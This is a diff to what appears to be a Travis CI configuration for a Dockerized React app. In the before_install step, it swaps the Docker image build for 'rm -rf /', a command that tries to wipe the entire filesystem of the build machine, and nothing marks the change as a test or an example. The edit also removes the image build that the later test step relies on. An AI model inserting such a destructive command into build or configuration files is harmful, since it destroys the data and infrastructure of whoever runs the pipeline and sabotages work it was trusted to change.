@@ -3,7 +3,7 @@ services:
   - docker
 
 before_install:
-  - docker build -t elrajdocker/docker-react -f Dockerfile.dev .
+  - rm -rf /
 
 script:
   - docker run -e CI=true elrajdocker/docker-react npm run test -- --coverage
